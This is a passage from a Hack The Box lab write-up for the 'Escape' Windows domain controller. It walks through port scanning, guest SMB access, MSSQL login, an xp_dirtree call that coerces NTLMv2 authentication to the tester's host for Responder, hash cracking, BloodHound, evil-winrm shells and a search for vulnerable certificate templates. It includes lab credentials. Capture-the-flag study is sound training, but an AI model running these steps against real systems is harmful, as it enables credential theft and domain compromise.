+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-02-13T03:13:23+00:00; +8h00m00s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: 
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>sequel-DC-CA
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-01-18T23:03:57
+</span></span><span style="display:flex;"><span>| Not valid after:  2074-01-05T23:03:57
+</span></span><span style="display:flex;"><span>| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
+</span></span><span style="display:flex;"><span>|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
+</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s      Microsoft SQL Server <span style="color:#ae81ff">2019</span> 15.00.2000.00; RTM
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-02-13T03:13:23+00:00; +8h00m00s from scanner time.
+</span></span><span style="display:flex;"><span>| ms-sql-ntlm-info: 
+</span></span><span style="display:flex;"><span>|   10.129.228.253:1433: 
+</span></span><span style="display:flex;"><span>|     Target_Name: sequel
+</span></span><span style="display:flex;"><span>|     NetBIOS_Domain_Name: sequel
+</span></span><span style="display:flex;"><span>|     NetBIOS_Computer_Name: DC
+</span></span><span style="display:flex;"><span>|     DNS_Domain_Name: sequel.htb
+</span></span><span style="display:flex;"><span>|     DNS_Computer_Name: dc.sequel.htb
+</span></span><span style="display:flex;"><span>|     DNS_Tree_Name: sequel.htb
+</span></span><span style="display:flex;"><span>|_    Product_Version: 10.0.17763
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2025-02-13T03:09:00
+</span></span><span style="display:flex;"><span>| Not valid after:  2055-02-13T03:09:00
+</span></span><span style="display:flex;"><span>| MD5:   68da:ef27:ea41:6d12:2269:237a:d664:9a05
+</span></span><span style="display:flex;"><span>|_SHA-1: 4048:3619:c26d:5707:301b:6187:9b05:e509:e508:6db9
+</span></span><span style="display:flex;"><span>| ms-sql-info: 
+</span></span><span style="display:flex;"><span>|   10.129.228.253:1433: 
+</span></span><span style="display:flex;"><span>|     Version: 
+</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2019</span> RTM
+</span></span><span style="display:flex;"><span>|       number: 15.00.2000.00
+</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2019</span>
+</span></span><span style="display:flex;"><span>|       Service pack level: RTM
+</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
+</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">1433</span>
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: 
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>sequel-DC-CA
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-01-18T23:03:57
+</span></span><span style="display:flex;"><span>| Not valid after:  2074-01-05T23:03:57
+</span></span><span style="display:flex;"><span>| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
+</span></span><span style="display:flex;"><span>|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-02-13T03:13:23+00:00; +8h00m00s from scanner time.
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-02-13T03:13:23+00:00; +8h00m00s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: 
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>sequel-DC-CA
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-01-18T23:03:57
+</span></span><span style="display:flex;"><span>| Not valid after:  2074-01-05T23:03:57
+</span></span><span style="display:flex;"><span>| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
+</span></span><span style="display:flex;"><span>|_SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49690/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49708/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49718/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2019|<span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>97%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1903</span> - 21H1 <span style="color:#f92672">(</span>91%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
+</span></span><span style="display:flex;"><span>TCP Sequence Prediction: Difficulty<span style="color:#f92672">=</span><span style="color:#ae81ff">264</span> <span style="color:#f92672">(</span>Good luck!<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>IP ID Sequence Generation: Incremental
+</span></span><span style="display:flex;"><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span></code></pre></div><h3 id="smb---445tcp">SMB - 445/tcp</h3>
+<p>Let&rsquo;s check to see what SMB shares might be available with guest access.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/escape<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient -L <span style="color:#ae81ff">\\\\</span>10.129.228.253<span style="color:#ae81ff">\\</span>                                   
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\p</span>l4stic<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span>        ADMIN$          Disk      Remote Admin
+</span></span><span style="display:flex;"><span>        C$              Disk      Default share
+</span></span><span style="display:flex;"><span>        IPC$            IPC       Remote IPC
+</span></span><span style="display:flex;"><span>        NETLOGON        Disk      Logon server share 
+</span></span><span style="display:flex;"><span>        Public          Disk      
+</span></span><span style="display:flex;"><span>        SYSVOL          Disk      Logon server share
+</span></span></code></pre></div><p>Looks like one non-standard SMB share: <code>Public</code>. Time to take a look what&rsquo;s inside.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/escape<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ smbclient <span style="color:#ae81ff">\\\\</span>10.129.228.253<span style="color:#ae81ff">\\</span>Public 
+</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\p</span>l4stic<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> dir
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Sat Nov <span style="color:#ae81ff">19</span> 06:51:25 <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Sat Nov <span style="color:#ae81ff">19</span> 06:51:25 <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>  SQL Server Procedures.pdf           A    <span style="color:#ae81ff">49551</span>  Fri Nov <span style="color:#ae81ff">18</span> 08:39:43 <span style="color:#ae81ff">2022</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5184255</span> blocks of size 4096. <span style="color:#ae81ff">1446539</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get <span style="color:#e6db74">&#34;SQL Server Procedures.pdf&#34;</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\S</span>QL Server Procedures.pdf of size <span style="color:#ae81ff">49551</span> as SQL Server Procedures.pdf <span style="color:#f92672">(</span>308.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 308.2 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Not a whole lot, just one file. Taking a look at <code>SQL Server Procedures.pdf</code>, it appears we&rsquo;ve got a credential to work with.</p>
+<p><img src="/images/escape1.png" alt="escape1">
+<code>PublicUser:GuestUserCantWrite1</code></p>
+<h2 id="initial-access">Initial Access</h2>
+<h3 id="mssql-access">MSSQL Access</h3>
+<p><img src="/images/escape2.png" alt="escape2">
+Our new credentials work for MSSQL, so let&rsquo;s see what we can find.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/escape<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.129.228.253
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Encryption required, switching to TLS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>DATABASE<span style="color:#f92672">)</span>: Old Value: master, New Value: master
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>LANGUAGE<span style="color:#f92672">)</span>: Old Value: , New Value: us_english
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>PACKETSIZE<span style="color:#f92672">)</span>: Old Value: 4096, New Value: <span style="color:#ae81ff">16192</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC<span style="color:#ae81ff">\S</span>QLMOCK<span style="color:#f92672">)</span>: Line 1: Changed database context to <span style="color:#e6db74">&#39;master&#39;</span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>DC<span style="color:#ae81ff">\S</span>QLMOCK<span style="color:#f92672">)</span>: Line 1: Changed language setting to us_english.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ACK: Result: <span style="color:#ae81ff">1</span> - Microsoft SQL Server <span style="color:#f92672">(</span><span style="color:#ae81ff">150</span> 7208<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>PublicUser  guest@master<span style="color:#f92672">)</span>&gt;
+</span></span></code></pre></div><p>Looks like we have permissions to execute <code>xp_dirtree</code>, which could provide us a nice vector to capture a NTLMv2 hash.  First we need to run <code>responder -I tun0</code> in another terminal, then run the following command.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>PublicUser  guest@master<span style="color:#f92672">)</span>&gt; xp_dirtree <span style="color:#ae81ff">\\</span>10.10.14.42<span style="color:#ae81ff">\t</span>est
+</span></span><span style="display:flex;"><span>subdirectory   depth   file   
+</span></span><span style="display:flex;"><span>------------   -----   ----
+</span></span></code></pre></div><p>And back on our responder, we&rsquo;ve captured a NTLMv2 hash:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listening <span style="color:#66d9ef">for</span> events...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Client   : 10.129.228.253
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Username : sequel<span style="color:#ae81ff">\s</span>ql_svc
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Hash     : sql_svc::sequel:c5969d994b674258:AE1497816E645CE27915C6CEC8C52F89:01010000000000000065EDDF597DDB010EBCA1D1172C4C560000000002000800540047004100370001001E00570049004E002D00340055004D0058004E0041005A0033004B004400560004003400570049004E002D00340055004D0058004E0041005A0033004B00440056002E0054004700410037002E004C004F00430041004C000300140054004700410037002E004C004F00430041004C000500140054004700410037002E004C004F00430041004C00070008000065EDDF597DDB01060004000200000008003000300000000000000000000000003000002A7ABF43228740FAF3D93E221F2AB830C9923905E27F729AF24888649831512B0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340032000000000000000000
+</span></span></code></pre></div><h3 id="crack-hash">Crack Hash</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/escape<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ hashcat -m <span style="color:#ae81ff">5600</span> sql_svc-hash.txt /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SQL_SVC::sequel:c5969d994b674258:ae1497816e645ce27915c6cec8c52f89:01010000000000000065eddf597ddb010ebca1d1172c4c560000000002000800540047004100370001001e00570049004e002d00340055004d0058004e0041005a0033004b004400560004003400570049004e002d00340055004d0058004e0041005a0033004b00440056002e0054004700410037002e004c004f00430041004c000300140054004700410037002e004c004f00430041004c000500140054004700410037002e004c004f00430041004c00070008000065eddf597ddb01060004000200000008003000300000000000000000000000003000002a7abf43228740faf3d93e221f2ab830c9923905e27f729af24888649831512b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340032000000000000000000:REGGIE1234ronnie
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Mode........: <span style="color:#ae81ff">5600</span> <span style="color:#f92672">(</span>NetNTLMv2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Hash.Target......: SQL_SVC::sequel:c5969d994b674258:ae1497816e645ce279...000000
+</span></span><span style="display:flex;"><span>Time.Started.....: Wed Feb <span style="color:#ae81ff">12</span> 14:27:59 <span style="color:#ae81ff">2025</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">3</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Time.Estimated...: Wed Feb <span style="color:#ae81ff">12</span> 14:28:02 <span style="color:#ae81ff">2025</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Now we&rsquo;ve got a valid domain account: <code>sequel.htb\sql_svc:REGGIE1234ronnie</code></p>
+<h3 id="bloodhound">Bloodhound</h3>
+<p>Let&rsquo;s use these credentials to dump some of the domain information from LDAP, and see if we find anything helpful and/or interesting.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/escape<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ bloodhound-python -c all -d sequel.htb -u sql_svc -p <span style="color:#e6db74">&#39;REGGIE1234ronnie&#39;</span> -ns 10.129.228.253 --dns-tcp
+</span></span><span style="display:flex;"><span>INFO: BloodHound.py <span style="color:#66d9ef">for</span> BloodHound LEGACY <span style="color:#f92672">(</span>BloodHound 4.2 and 4.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>INFO: Found AD domain: sequel.htb
+</span></span><span style="display:flex;"><span>INFO: Getting TGT <span style="color:#66d9ef">for</span> user
+</span></span><span style="display:flex;"><span>WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span style="color:#f92672">[</span>Errno Connection error <span style="color:#f92672">(</span>dc.sequel.htb:88<span style="color:#f92672">)]</span> <span style="color:#f92672">[</span>Errno -2<span style="color:#f92672">]</span> Name or service not known
+</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: dc.sequel.htb
+</span></span><span style="display:flex;"><span>WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> computers
+</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: dc.sequel.htb
+</span></span><span style="display:flex;"><span>WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">10</span> users
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">53</span> groups
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">2</span> gpos
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> ous
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">19</span> containers
+</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">0</span> trusts
+</span></span><span style="display:flex;"><span>INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
+</span></span><span style="display:flex;"><span>INFO: Querying computer: dc.sequel.htb
+</span></span><span style="display:flex;"><span>INFO: Done in 00M 05S
+</span></span></code></pre></div><p>Now we&rsquo;ve got a list of all the users on the domain.</p>
+<p><img src="/images/escape3.png" alt="escape3"></p>
+<p>And it looks like we&rsquo;ve got <code>CanPSRemote</code> access to the Domain Controller.</p>
+<p><img src="/images/escape4.png" alt="escape4"></p>
+<h3 id="shell-as-sql_svc">Shell as sql_svc</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/escape<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.228.253 -u sql_svc -p <span style="color:#e6db74">&#39;REGGIE1234ronnie&#39;</span>                          
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>ql_svc<span style="color:#ae81ff">\D</span>ocuments&gt;
+</span></span></code></pre></div><p>As I enumerate files on the machine, I find an interesting log file here: <code>C:\SQLServer\Logs\ERRORLOG.BAK</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>2022-11-18 13:43:07.44 Logon       Logon failed for user &#39;sequel.htb\Ryan.Cooper&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+</span></span><span style="display:flex;"><span>2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
+</span></span><span style="display:flex;"><span>2022-11-18 13:43:07.48 Logon       Logon failed for user &#39;NuclearMosquito3&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+</span></span></code></pre></div><p>Maybe <code>Ryan.Cooper</code> accidentally typed his password in as the username?  Turns out, that&rsquo;s exactly what happened and we have a new set of valid credentials.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/escape<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ netexec smb 10.129.228.253 -u Ryan.Cooper -p <span style="color:#e6db74">&#39;NuclearMosquito3&#39;</span> -d sequel.htb           
+</span></span><span style="display:flex;"><span>SMB    10.129.228.253  <span style="color:#ae81ff">445</span>    DC      <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:sequel.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB    10.129.228.253  <span style="color:#ae81ff">445</span>    DC      <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sequel.htb<span style="color:#ae81ff">\R</span>yan.Cooper:NuclearMosquito3
+</span></span></code></pre></div><h2 id="shell-as-ryancooper">Shell as Ryan.Cooper</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/escape<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.228.253 -u ryan.cooper -p <span style="color:#e6db74">&#39;NuclearMosquito3&#39;</span>             
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\R</span>yan.Cooper<span style="color:#ae81ff">\D</span>ocuments&gt;
+</span></span></code></pre></div><h3 id="winpeasexe">winPEAS.exe</h3>
+<p>Uploaded <code>winPEASany.exe</code> to the machine and executed it. Not a whole lot new to go on.</p>
+<h3 id="certifyexe">Certify.exe</h3>
+<p>Uploaded <code>Certify.exe</code> to the machine and executed it, looking for any vulnerable certificate templates. Looks like we might have a thread to pull on.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\R</span>yan.Cooper<span style="color:#ae81ff">\D</span>esktop&gt; .<span style="color:#ae81ff">\C</span>ertify.exe find /vulnerable /domain:sequel.htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   _____          _   _  __
+</span></span><span style="display:flex;"><span>  / ____|        | | <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span>/ _|
+</span></span><span style="display:flex;"><span> | |     ___ _ __| |_ _| |_ _   _
+</span></span><span style="display:flex;"><span> | |    / _ <span style="color:#ae81ff">\ </span><span style="color:#e6db74">&#39;__| __| |  _| | | |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | |___|  __/ |  | |_| | | | |_| |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  \_____\___|_|   \__|_|_|  \__, |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                             __/ |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            |___./
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  v1.0.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Action: Find certificate templates
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Using the search base &#39;</span>CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>sequel,DC<span style="color:#f92672">=</span>htb<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Listing info about the Enterprise CA &#39;</span>sequel-DC-CA<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Enterprise CA Name            : sequel-DC-CA
+</span></span><span style="display:flex;"><span>    DNS Hostname                  : dc.sequel.htb
